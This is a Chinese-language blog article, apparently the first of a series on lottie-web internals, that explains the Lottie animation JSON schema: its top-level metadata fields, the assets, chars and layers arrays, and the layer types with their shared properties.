content="Lottie-web 源码解析（一）：从 JSON Schema 认识 Lottie 动画的本质📒"/> <meta itemprop="keywords" content="前端,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-13T02:34:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哨卫哥"/> <meta itemprop="url" content="https://juejin.cn/user/2159893031168119"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lottie-web 源码解析（一）：从 JSON Schema 认识 Lottie 动画的本质📒
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2159893031168119/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哨卫哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:34:12.000Z" title="Tue Jan 13 2026 02:34:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读41分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>Lottie 的本质是 <strong>After Effects 动画的 Web 播放器</strong>，其工作流程清晰简洁：</p>
<ol>
<li><strong>设计</strong> → 设计师在 <strong>After Effects（AE）</strong> 中制作矢量动画</li>
<li><strong>导出</strong> → 通过 Bodymovin 插件将动画导出为轻量的 <code>data.json</code> 文件</li>
<li><strong>播放</strong> → web 开发者使用 <code>lottie-web</code> 库解析该 JSON，并在浏览器中实时渲染动画</li>
</ol>
<p>若想深入理解 Lottie 的动画机制，从 <strong>JSON Schema</strong> 入手是一条清晰的路径。Lottie 是一个完全由数据驱动的动画系统，掌握其 JSON 结构，就等于握住了理解动画渲染逻辑的钥匙。当然，Lottie JSON 的配置项较为丰富，不必追求一次性全部记住。本文旨在帮助大家建立初步认知，为后续学习渲染引擎打下基础，做到“知其然，亦知其所以然”。</p>
<h2 data-id="heading-0"><strong>一、初识 data.json ：动画数据的顶层结构</strong></h2>
<p>Lottie 动画的本质是一套<strong>由数据驱动的图形绘制指令集</strong>，而 <code>data.json</code> 文件正是这套指令的完整载体。其<strong>顶层结构</strong>定义了动画的全局元信息，如同电影的“导演台本”，设定了动画播放的<strong>画布尺寸、时间线与基础环境</strong>。理解这些字段，是后续深入解析图层、关键帧等复杂属性的根基。</p>
<h3 data-id="heading-1"><strong>顶层元数据：动画的全局定义</strong></h3>
<p>下表列出了 <code>data.json</code> 根对象（Root Object）中的核心元数据字段，它们共同框定了动画的时空属性与渲染基础。</p>




































































<table><thead><tr><th>字段</th><th>类型</th><th>描述</th><th>示例值</th><th>单位/备注</th></tr></thead><tbody><tr><td><strong>v</strong></td><td><code>string</code></td><td><strong>Bodymovin 插件版本</strong>：生成此 JSON 所用的插件版本号，不同版本可能支持不同的特性。</td><td><code>"5.7.4"</code></td><td>-</td></tr><tr><td><strong>fr</strong></td><td><code>number</code></td><td><strong>帧率（Frame Rate）</strong> ：动画的播放速率，直接决定动画的流畅度与时间计算基准。</td><td><code>30</code>, <code>60</code></td><td>帧/秒 (fps)</td></tr><tr><td><strong>ip</strong></td><td><code>number</code></td><td><strong>起始帧（In Point）</strong> ：动画时间轴开始的绝对帧编号。</td><td><code>0</code></td><td>帧</td></tr><tr><td><strong>op</strong></td><td><code>number</code></td><td><strong>结束帧（Out Point）</strong> ：动画时间轴结束的绝对帧编号。动画总时长 = <code>(op - ip) / fr</code> 秒。</td><td><code>90</code></td><td>帧</td></tr><tr><td><strong>w</strong></td><td><code>number</code></td><td><strong>画布宽度</strong>：动画合成（Composition）的逻辑宽度。</td><td><code>800</code></td><td>像素 (px)</td></tr><tr><td><strong>h</strong></td><td><code>number</code></td><td><strong>画布高度</strong>：动画合成的逻辑高度。</td><td><code>600</code></td><td>像素 (px)</td></tr><tr><td><strong>nm</strong></td><td><code>string</code></td><td><strong>合成名称（Name）</strong> ：对应 After Effects 中合成的名称，便于识别。</td><td><code>"元数据演示动画"</code></td><td>-</td></tr><tr><td><strong>ddd</strong></td><td><code>integer</code></td><td><strong>3D 图层标识</strong>：标识此合成中<strong>是否包含 3D 图层或摄像机</strong>。<code>0</code> 代表否（默认），<code>1</code> 代表是。</td><td><code>0</code></td><td>-</td></tr></tbody></table>
<p>综合以上字段，一个定义了800x600画布、30fps、时长3秒的2D动画，其顶层结构示例如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.7.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"fr"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ip"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">800</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"h"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">600</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"元数据演示动画"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ddd"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-2"><strong>核心组成：图层、资源与字形</strong></h3>
<p><code>assets</code>、<code>chars</code> 与 <code>layers</code> 是构成 Lottie 动画内容的三个核心数据数组。它们分别定义了可复用的素材、矢量字形以及图层的序列与属性，共同描述了动画的全部视觉信息与动态行为。</p>
<h4 data-id="heading-3"><strong><code>assets</code> - 可复用资源库</strong></h4>
<p><code>assets</code> 数组用于集中定义动画中可被多次引用的静态或动态资源。此设计实现了资源复用，有助于优化文件体积并保证引用的一致性。</p>


























<table><thead><tr><th>资源类型</th><th>类型标识 (<code>ty</code>)</th><th>内容描述</th><th>引用字段</th><th>主要用途</th></tr></thead><tbody><tr><td><strong>图像资源</strong></td><td><code>"img"</code></td><td>包含图像ID、尺寸及文件路径或Base64编码数据。</td><td><code>refId</code></td><td>静态位图元素，如图标、背景。</td></tr><tr><td><strong>预合成资源</strong></td><td><code>"precomp"</code></td><td>一个完整的子合成，包含独立的图层(<code>layers</code>)与时间轴。</td><td><code>refId</code></td><td>可重复使用的动画片段，如通用动效组件。</td></tr></tbody></table>
<p><strong>引用机制</strong>：图层通过其 <code>refId</code> 属性与 <code>assets</code> 中对应ID的资源进行关联。渲染时，引擎据此查找并绘制相应资源。</p>
<h4 data-id="heading-4"><strong><code>chars</code> - 矢量字形定义</strong></h4>
<p><code>chars</code> 数组存储了将文字转换为矢量形状后的数据。当动画需要对文字进行路径变形、描边动画等超越普通文本渲染能力的操作时，会使用此数组。</p>
<ul>
<li><strong>产生条件</strong>：在After Effects中对文本图层执行“从文字创建形状”，或在导出时启用“字符形状”选项。</li>
<li><strong>数据结构</strong>：每个项定义了字符、字体信息及其矢量路径(<code>data</code>)，该路径数据包含轮廓、描边与填充等属性。</li>
<li><strong>核心用途</strong>：实现对文字字符的精细化控制，用于制作字形变形、笔画动画等效果。</li>
</ul>
<h4 data-id="heading-5"><strong><code>layers</code> - 动画图层序列</strong></h4>
<p><code>layers</code> 是一个有序数组，定义了所有图层的叠加顺序、基本属性及关键帧动画。它是组织动画渲染逻辑的主体。</p>
<ul>
<li><strong>渲染顺序</strong>：数组索引从0开始，图层按索引升序从底层到顶层依次渲染。</li>
<li><strong>核心属性</strong>：每个图层对象包含类型（如形状、图像、文本）、空间变换属性、蒙版以及关键帧动画数据。</li>
<li><strong>关键作用</strong>：<code>assets</code> 和 <code>chars</code> 中定义的资源需在此被引用，并通过图层的动画属性驱动，才能成为最终动画的一部分。</li>
</ul>
<p><strong>协作关系</strong>：<code>assets</code> 和 <code>chars</code> 作为资源定义，为 <code>layers</code> 提供素材；<code>layers</code> 则负责组织这些素材，并通过其时间轴和属性控制动画的最终表现。一个完整的结构示例如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5.7.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"fr"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ip"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"op"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"w"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">800</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"h"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">600</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"nm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"元数据演示动画"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ddd"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"assets"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"layers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"chars"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-6"><strong>二、图层系统 - 理解 Layers 结构</strong>⭐️</h2>
<p><code>layers</code> 数组是 Lottie JSON 中承载所有动画图层信息的主体。它定义了图层的堆叠顺序、属性及关键帧动画，是构成动画视觉呈现与动态行为的核心数据结构。Lottie 主要包含以下六种基础图层类型：</p>








































<table><thead><tr><th>类型标识 (<code>ty</code>)</th><th>图层类型</th><th>核心描述</th></tr></thead><tbody><tr><td><strong>0</strong></td><td><strong>预合成图层 (Precomp Layer)</strong></td><td>嵌套合成层，通过 <code>refId</code> 引用 <code>assets</code> 中定义的预合成资源，实现动画复用与模块化管理。</td></tr><tr><td><strong>1</strong></td><td><strong>纯色图层 (Solid Layer)</strong></td><td>纯色填充层，定义固定颜色的矩形区域，常用作背景或遮罩。</td></tr><tr><td><strong>2</strong></td><td><strong>图像图层 (Image Layer)</strong></td><td>静态图片层，通过 <code>refId</code> 引用 <code>assets</code> 中定义的图像资源。</td></tr><tr><td><strong>3</strong></td><td><strong>空对象图层 (Null Layer)</strong></td><td>不可见辅助层，主要用于通过其 <code>ks</code> 属性（变换数据）驱动子图层动画，或作为动画控制器。</td></tr><tr><td><strong>4</strong></td><td><strong>形状图层 (Shape Layer)</strong></td><td>矢量图形层，由路径、描边、填充等属性构成，是制作变形、路径动画的基础。</td></tr><tr><td><strong>5</strong></td><td><strong>文本图层 (Text Layer)</strong></td><td>文字图层，可定义字体、颜色、段落样式，并支持逐字符动画。</td></tr></tbody></table>
<p>所有图层共享一组基础属性，用于定义其在合成中的基本状态与时空关系。</p>
<p>以下属性为<strong>所有图层类型</strong>共有的基础属性：</p>





















































































































<table><thead><tr><th>属性</th><th>类型</th><th>必选</th><th>描述</th><th>示例值</th><th>默认值</th></tr></thead><tbody><tr><td><strong><code>ty</code></strong></td><td><code>number</code></td><td>是</td><td><strong>图层类型标识</strong>，决定图层的行为和数据结构（见上表）</td><td><code>0</code>-<code>5</code></td><td>-</td></tr><tr><td><strong><code>nm</code></strong></td><td><code>string</code> / <code>number</code></td><td>否</td><td><strong>图层名称</strong>，在 After Effects 中设置，用于表达式和调试</td><td><code>"按钮背景"</code>, <code>"Layer 1"</code></td><td>-</td></tr><tr><td><strong><code>ind</code></strong></td><td><code>number</code></td><td>是</td><td><strong>图层索引</strong>，在整个合成中唯一，用于父子关联和表达式引用</td><td><code>1</code>, <code>2</code>, <code>3</code></td><td>-</td></tr><tr><td><strong><code>ip</code></strong></td><td><code>number</code></td><td>是</td><td><strong>入点 (In Point)</strong>，图层开始显示的帧数</td><td><code>0</code>, <code>30</code></td><td>-</td></tr><tr><td><strong><code>op</code></strong></td><td><code>number</code></td><td>是</td><td><strong>出点 (Out Point)</strong>，图层结束显示的帧数</td><td><code>90</code>, <code>180</code></td><td>-</td></tr><tr><td><strong><code>st</code></strong></td><td><code>number</code></td><td>是</td><td><strong>起始时间 (Start Time)</strong>，图层的时间偏移量</td><td><code>0</code>, <code>10</code></td><td>-</td></tr><tr><td><strong><code>sr</code></strong></td><td><code>number</code></td><td>否</td><td><strong>时间拉伸 (Stretch)</strong>，控制图层播放速度的系数</td><td><code>1</code> (正常), <code>0.5</code> (减速), <code>2</code> (加速)</td><td><code>1</code></td></tr><tr><td><strong><code>ks</code></strong></td><td><code>object</code></td><td>是</td><td><strong>变换属性 (Transform)</strong>，包含位置、缩放、旋转、透明度等关键帧数据</td><td>见下方详解</td><td>-</td></tr><tr><td><strong><code>ao</code></strong></td><td><code>number</code></td><td>否</td><td><strong>自动定向 (Auto-Orient)</strong>，沿路径自动调整图层方向（布尔值：0/1）</td><td><code>0</code> (关闭), <code>1</code> (开启)</td><td><code>0</code></td></tr><tr><td><strong><code>ddd</code></strong></td><td><code>number</code></td><td>否</td><td><strong>3D 图层标识</strong>，标记该图层是否为 3D 图层（布尔值：0/1）</td><td><code>0</code> (2D), <code>1</code> (3D)</td><td><code>0</code></td></tr><tr><td><strong><code>parent</code></strong></td><td><code>number</code></td><td>否</td><td><strong>父图层索引</strong>，指向父图层的 <code>ind</code> 值，实现层级控制和联动变换</td><td><code>1</code>, <code>5</code></td><td>-</td></tr><tr><td><strong><code>cl</code></strong></td><td><code>string</code></td><td>否</td><td><strong>CSS 类名 (Class)</strong>，在 SVG/HTML 渲染器中作为 HTML class</td><td><code>"background"</code>, <code>"icon"</code></td><td>-</td></tr><tr><td><strong><code>ln</code></strong></td><td><code>string</code></td><td>否</td><td><strong>HTML ID</strong>，在 SVG/HTML 渲染器中作为 HTML id 属性</td><td><code>"layer-bg"</code>, <code>"main-icon"</code></td><td>-</td></tr></tbody></table>
